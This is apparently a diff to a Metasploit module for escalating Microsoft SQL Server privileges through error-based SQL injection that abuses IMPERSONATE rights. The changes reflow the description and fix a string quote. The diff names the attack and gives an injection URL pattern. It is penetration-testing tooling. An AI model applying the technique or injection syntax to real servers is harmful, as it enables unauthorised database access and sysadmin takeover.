@@ -15,13 +15,12 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Microsoft SQL Server - SQLi Escalate Execute As',
       'Description'    => %q{
-        This module can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user
-        via error based SQL injection.  In most cases this results in additional data access, but in some cases it can be used to gain sysadmin
-        privileges.
-
+        This module can be used escalate privileges if the IMPERSONATION privilege has been
+        assigned to the user via error based SQL injection.  In most cases this results in
+        additional data access, but in some cases it can be used to gain sysadmin privileges.
         The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
       },
-      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
+      'Author'         => ['nullbind <scott.sutherland[at]netspi.com>'],
       'License'        => MSF_LICENSE,
       'References'     => [['URL','http://msdn.microsoft.com/en-us/library/ms178640.aspx']]
     ))
@@ -56,7 +55,7 @@ class Metasploit3 < Msf::Auxiliary
     print_status("#{peer} - Enumerating a list of users that can be impersonated...")
     imp_user_list = check_imp_users
     if imp_user_list.nil? || imp_user_list.length == 0
-      print_error('#{peer} - Sorry, the current user doesnt have permissions to impersonate anyone.')
+      print_error("#{peer} - Sorry, the current user doesnt have permissions to impersonate anyone.")
       return
     else
       # Display list of users that can be impersonated
